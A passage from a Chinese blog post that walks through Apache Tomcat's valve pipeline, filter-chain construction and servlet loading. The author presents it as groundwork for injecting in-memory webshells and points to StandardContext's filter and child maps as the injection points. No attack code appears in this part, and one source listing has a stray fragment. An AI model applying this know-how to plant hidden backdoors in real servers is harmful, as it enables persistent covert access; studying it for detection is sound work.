<p>看下其基础阀的 invoke 方法代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Disallow any direct access to resources under WEB-INF or META-INF</span></span><br><span class="line">    MessageBytes requestPathMB = request.getRequestPathMB();</span><br><span class="line">    <span class="keyword">if</span> ((requestPathMB.startsWithIgnoreCase(<span class="string">&quot;/META-INF/&quot;</span>, <span class="number">0</span>))</span><br><span class="line">            || (requestPathMB.equalsIgnoreCase(<span class="string">&quot;/META-INF&quot;</span>))</span><br><span class="line">            || (requestPathMB.startsWithIgnoreCase(<span class="string">&quot;/WEB-INF/&quot;</span>, <span class="number">0</span>))</span><br><span class="line">            || (requestPathMB.equalsIgnoreCase(<span class="string">&quot;/WEB-INF&quot;</span>))) &#123;</span><br><span class="line">        response.sendError(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Select the Wrapper to be used for this Request</span></span><br><span class="line">    Wrapper wrapper = request.getWrapper();</span><br><span class="line">    <span class="keyword">if</span> (wrapper == <span class="keyword">null</span> || wrapper.isUnavailable()) &#123;</span><br><span class="line">        response.sendError(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Acknowledge the request</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        response.sendAcknowledgement();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">        container.getLogger().error(sm.getString(</span><br><span class="line">                <span class="string">&quot;standardContextValve.acknowledgeException&quot;</span>), ioe);</span><br><span class="line">        request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, ioe);</span><br><span class="line">        response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request.isAsyncSupported()) &#123;</span><br><span class="line">        request.setAsyncSupported(wrapper.getPipeline().isAsyncSupported());</span><br><span class="line">    &#125;</span><br><span class="line">    wrapper.getPipeline().getFirst().invoke(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后一 行，从请求中取出关联的 wrapper 对象后调用其管道内所有阀的 invoke 方法最后调用基础阀StandardWrapperValve的invoke方法。wrapper 对象默认是<code>org.apache.catalina.core.StandardWrapper</code>类的实例，同样是在该类的构造方法中设置的基础阀：</p>
<p><img src="image-20220119174813113.png" alt="image-20220119174813113"></p>
<p>我们来看StandardWrapperValve的invoke方法，代码很长我们直接看关键代码。</p>
<p>关键代码：</p>
<ol>
<li>这儿调用Wrapper的allocate()方法分配一个Servlet实例，前面提到wrapper 对象默认是<code>org.apache.catalina.core.StandardWrapper</code>类的实例</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!unavailable) &#123;</span><br><span class="line">    servlet = wrapper.allocate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>allocate方法里真正加载并初始化servlet实例的是loadServlet方法</p>
<p><img src="image-20220121143821246.png" alt="image-20220121143821246"></p>
<p>loadServlet方法通过实例管理器，创建Servlet实例</p>
<p><img src="image-20220121143932662.png" alt="image-20220121143932662"></p>
<p>最后返回Servlet</p>
<p><img src="image-20220209191023032.png" alt="image-20220209191023032"></p>
<p>回到StandardWrapperValve中继续往下执行，创建过滤器链</p>
<p><img src="image-20220209191201097.png" alt="image-20220209191201097"></p>
<ol start="2">
<li>创建过滤器链，类似于Pipeline的功能</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure>

<p>创建过滤器链是调用的<code>org.apache.catalina.core.ApplicationFilterFactory</code>的<code>createFilterChain()</code>方法。</p>
<p>初始化一个空的 FilterChain。</p>
<p><img src="image-20220121205556936.png" alt="image-20220121205556936"></p>
<p>设置Servlet</p>
<p><img src="image-20220121205819892.png" alt="image-20220121205819892"></p>
<p>获取StandardContext对象，然后调用StandardContext对象的findFilterMaps方法。</p>
<p><img src="image-20220121210017081.png" alt="image-20220121210017081"></p>
<p>findFilterMaps方法返回filterMaps属性，filterMaps属性是一个ContextFilterMaps对象，里面的array属性是FilterMap对象，FilterMap对象中存储着filter的web.xml的配置信息。FilterMap的filterName属性存储着<code>&lt;filter-name&gt;</code>标签的内容，urlPatterns属性存储着<code>&lt;url-pattern&gt;</code>标签的内容。</p>
<p><img src="image-20220121221644901.png" alt="image-20220121221644901"></p>
<p><img src="image-20220121211150103.png" alt="image-20220121211150103"></p>
<p><img src="image-20220121210511462.png" alt="image-20220121210511462"></p>
<p><img src="image-20220121211439109.png" alt="image-20220121211439109"></p>
<p>获取请求的URL路径和Servlet的名字。</p>
<p><img src="image-20220121212412796.png" alt="image-20220121212412796"></p>
<p>调用FilterMap对象的getFilterName方法，获取ContextFilterMaps对象的FilterMap对象中的filterName属性</p>
<p><img src="image-20220121213550647.png" alt="image-20220121213550647"></p>
<p><img src="image-20220121213621056.png" alt="image-20220121213621056"></p>
<p>再调用StandardContext对象的findFilterConfig方法。filterConfigs是一个HashMap对象，里面存放着String和ApplicationFilterConfig类型的键值对对象。这里返回filterConfigs对象中key为FilterDemo的value对象，也就是ApplicationFilterConfig对象。</p>
<p><img src="image-20220121214135129.png" alt="image-20220121214135129"></p>
<p><img src="image-20220121214246222.png" alt="image-20220121214246222"></p>
<p>ApplicationFilterConfig对象存放着filterDef对象，filterDef对象中存放着filterClass和filterName的定义</p>
<p><img src="image-20220121214841718.png" alt="image-20220121214841718"></p>
<p>继续往下执行，将filterConfig添加到filterChain的filters数组中</p>
<p><img src="image-20220121220435589.png" alt="image-20220121220435589"></p>
<p>返回FilterChain</p>
<p><img src="image-20220121220550065.png" alt="image-20220121220550065"></p>
<p>回到StandardWrapperValve的invoke方法。</p>
<p><img src="image-20220121220836758.png" alt="image-20220121220836758"></p>
<ol start="3">
<li>调用过滤器链的doFilter，最终会调用到Servlet的service方法</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChain.doFilter(request.getRequest(),response.getResponse());</span><br></pre></td></tr></table></figure>

<p>ApplicationFilterChain类的doFilter函数代码如下,它会将处理委托给internalDoFilter函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">        <span class="keyword">final</span> ServletRequest req = request;</span><br><span class="line">        <span class="keyword">final</span> ServletResponse res = response;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.security.AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> java.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                        <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">                        internalDoFilter(req,res);</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">catch</span>( PrivilegedActionException pe) &#123;</span><br><span class="line">            Exception e = pe.getException();</span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ServletException)</span><br><span class="line">                <span class="keyword">throw</span> (ServletException) e;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> IOException)</span><br><span class="line">                <span class="keyword">throw</span> (IOException) e;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RuntimeException)</span><br><span class="line">                <span class="keyword">throw</span> (RuntimeException) e;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(e.getMessage(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        internalDoFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ApplicationFilterChain类的internalDoFilter函数代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. internalDoFilter方法通过pos和n来调用过滤器链里面的每个过滤器。pos表示当前的过滤器下标，n表示总的过滤器数量</span></span><br><span class="line"><span class="comment">// 2. internalDoFilter方法最终会调用servlet.service()方法</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">internalDoFilter</span><span class="params">(ServletRequest request,</span></span></span><br><span class="line"><span class="params"><span class="function">                              ServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">    <span class="comment">// 1. 当pos小于n时, 则执行Filter</span></span><br><span class="line">    <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">        <span class="comment">// 2. 得到 过滤器 Filter，执行一次post++</span></span><br><span class="line">        ApplicationFilterConfig filterConfig = filters[pos++];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Filter filter = filterConfig.getFilter();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="string">&quot;false&quot;</span>.equalsIgnoreCase(</span><br><span class="line">                    filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                <span class="keyword">final</span> ServletRequest req = request;</span><br><span class="line">                <span class="keyword">final</span> ServletResponse res = response;</span><br><span class="line">                Principal principal =</span><br><span class="line">                    ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line"></span><br><span class="line">                Object[] args = <span class="keyword">new</span> Object[]&#123;req, res, <span class="keyword">this</span>&#125;;</span><br><span class="line">                SecurityUtil.doAsPrivilege (<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 4. 这里的 filter 的执行 有点递归的感觉, 通过 pos 来控制从 filterChain 里面拿出那个 filter 来进行操作</span></span><br><span class="line">                <span class="comment">// 这里把this（filterChain）传到自定义filter里面，我们自定义的filter，会重写doFilter，在这里会被调用，doFilter里面会执行业务逻辑，如果执行业务逻辑成功，则会调用 filterChain.doFilter(servletRequest, servletResponse); ，filterChain就是这里传过去的this；如果业务逻辑执行失败，则return，filterChain终止，后面的servlet.service(request, response)也不会执行了</span></span><br><span class="line">                <span class="comment">// 所以在 Filter 里面所调用 return, 则会终止 Filter 的调用, 而下面的 Servlet.service 更本就没有调用到</span></span><br><span class="line">                filter.doFilter(request, response, <span class="keyword">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">            ExceptionUtils.handleThrowable(e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(sm.getString(<span class="string">&quot;filterChain.filter&quot;</span>), e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We fell off the end of the chain -- call the servlet instance</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">            lastServicedRequest.set(request);</span><br><span class="line">            lastServicedResponse.set(response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;</span><br><span class="line">            request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,</span><br><span class="line">                    Boolean.FALSE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Use potentially wrapped request from this point</span></span><br><span class="line">        <span class="keyword">if</span> ((request <span class="keyword">instanceof</span> HttpServletRequest) &amp;&amp;</span><br><span class="line">                (response <span class="keyword">instanceof</span> HttpServletResponse) &amp;&amp;</span><br><span class="line">                Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> ServletRequest req = request;</span><br><span class="line">            <span class="keyword">final</span> ServletResponse res = response;</span><br><span class="line">            Principal principal =</span><br><span class="line">                ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line">            Object[] args = <span class="keyword">new</span> Object[]&#123;req, res&#125;;</span><br><span class="line">            SecurityUtil.doAsPrivilege(<span class="string">&quot;service&quot;</span>,</span><br><span class="line">                                       servlet,</span><br><span class="line">                                       classTypeUsedInService,</span><br><span class="line">                                       args,</span><br><span class="line">                                       principal);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//当pos等于n时，过滤器都执行完毕，终于执行了熟悉的servlet.service(request, response)方法。</span></span><br><span class="line">            servlet.service(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">        ExceptionUtils.handleThrowable(e);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(sm.getString(<span class="string">&quot;filterChain.servlet&quot;</span>), e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">            lastServicedRequest.set(<span class="keyword">null</span>);</span><br><span class="line">            lastServicedResponse.set(<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pos和n是ApplicationFilterChain的成员变量，分别表示过滤器链的当前位置和过滤器总数，所以当pos小于n时，会不断执行ApplicationFilterChain的doFilter方法；当pos等于n时，过滤器都执行完毕，最后执行servlet.service(request, response)方法。</p>
<h4 id="Servlet加载与初始化"><a href="#Servlet加载与初始化" class="headerlink" title="Servlet加载与初始化"></a>Servlet加载与初始化</h4><p>容器组件（ StandardEngine、StandardHost、StandardContext、StandardWrapper ）都会继承父类<code>org.apache.catalina.core.ContainerBase</code>，在这些容器组件启动时将会调用自己内部的 startInternal 方法，在该方法内部一般会调用父类的 startInternal 方法（ StandardContext 类的实现除外），StandardContext 类会调用自己的startInternal 方法，在StandardContext 类的startInternal 方法中，会调用loadOnStartup方法，加载并初始化所有“load on startup”servlet。</p>
<p><img src="image-20220209203543195.png" alt="image-20220209203543195"></p>
<p>跟进findChildren</p>
<blockquote>
<p>children是一个子容器。</p>
</blockquote>
<p>children是一个HashMap类型对象，存储着StandardWrapper对象，然后将HashMap类型对象转换为Container类型return，然后进入loadOnStartup方法。这个children就是我们注入Servlet内存马的关键，会在内存马的实现中用到。</p>
<p><img src="image-20220209203848786.png" alt="image-20220209203848786"></p>
<p><img src="image-20220209210052521.png" alt="image-20220209210052521"></p>
<p><strong>loadOnStartup</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StandardContext</span> <span class="keyword">extends</span> <span class="title">ContainerBase</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Context</span>, <span class="title">NotificationEmitter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">loadOnStartup</span><span class="params">(Container children[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> TreeMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">            Wrapper wrapper = (Wrapper) child; </span><br><span class="line">            <span class="keyword">int</span> loadOnStartup = wrapper.getLoadOnStartup();<span class="comment">//获取loadOnStartup值</span></span><br><span class="line">            <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123; </span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Integer key = Integer.valueOf(loadOnStartup);<span class="comment">//这里key的值就是loadOnStartup值</span></span><br><span class="line">            ArrayList&lt;Wrapper&gt; list = map.get(key);<span class="comment">//获取map指定键映射到的值，这里前面并没有添加元素到map中，所以是null</span></span><br><span class="line">            <span class="keyword">if</span> (list == <span class="keyword">null</span>) &#123;</span><br><span class="line">                list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                map.put(key, list);<span class="comment">//将list添加到map中</span></span><br><span class="line">            &#125;&lt;&gt;()</span><br><span class="line">            list.add(wrapper); <span class="comment">//将wrapper添加到list中，这里的list是ArrayList&lt;&gt;()</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">        <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    wrapper.load(); <span class="comment">// 调用wrapper的load方法加载servlet</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">                    getLogger().error(sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>,</span><br><span class="line">                          getName(), wrapper.getName()), StandardWrapper.getRootCause(e));</span><br><span class="line">                    <span class="keyword">if</span>(getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>加载并初始化</p>
<p><img src="image-20220211145937127.png" alt="image-20220211145937127"></p>
<h4 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h4><p>StandardContext是Context的实现类，初始化各种Listener、Filter和Servlet，内存马都是基于修改StandardContext来实现的，下面介绍几个在注入内存马中会用到的方法及属性</p>
<p><strong>filterConfigs属性</strong></p>
<p>存放着filter配置以及实例，以filter名键入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The set of filter configurations (and associated filter instances) we</span></span><br><span class="line"><span class="comment"> * have initialized, keyed by filter name.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs =</span><br><span class="line">        <span class="keyword">new</span> HashMap&lt;&gt;();</span><br></pre></td></tr></table></figure>

<p><strong>filterDefs</strong></p>
<p>filter定义集，以filter名键入，存储着filter的定义</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The set of filter definitions for this application, keyed by</span></span><br><span class="line"><span class="comment"> * filter name.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> HashMap&lt;String, FilterDef&gt; filterDefs = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br></pre></td></tr></table></figure>

<p><strong>filterMaps</strong></p>
<p>filter映射集，存储着filter的映射关系</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The set of filter mappings for this application, in the order</span></span><br><span class="line"><span class="comment"> * they were defined in the deployment descriptor with additional mappings</span></span><br><span class="line"><span class="comment"> * added via the &#123;<span class="doctag">@link</span> ServletContext&#125; possibly both before and after those</span></span><br><span class="line"><span class="comment"> * defined in the deployment descriptor.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ContextFilterMaps filterMaps = <span class="keyword">new</span> ContextFilterMaps();</span><br></pre></td></tr></table></figure>

<ol>
<li><p>addApplicationEventListener</p>
<p>将侦听器添加到初始化的应用程序事件侦听器列表的末尾</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add a listener to the end of the list of initialized application event</span></span><br><span class="line"><span class="comment"> * listeners.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> listener The listener to add</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addApplicationEventListener</span><span class="params">(Object listener)</span> </span>&#123;</span><br><span class="line">    applicationEventListenersList.add(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>addFilterDef</p>
<p>为Context添加一个Filter定义</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add a filter definition to this Context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filterDef The filter definition to be added</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFilterDef</span><span class="params">(FilterDef filterDef)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (filterDefs) &#123;</span><br><span class="line">        filterDefs.put(filterDef.getFilterName(), filterDef);</span><br><span class="line">    &#125;</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterDef&quot;</span>, filterDef);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>addFilterMap</p>
<p>在当前的Filter映射集的末尾添加一个Filter映射到这个Context</p>
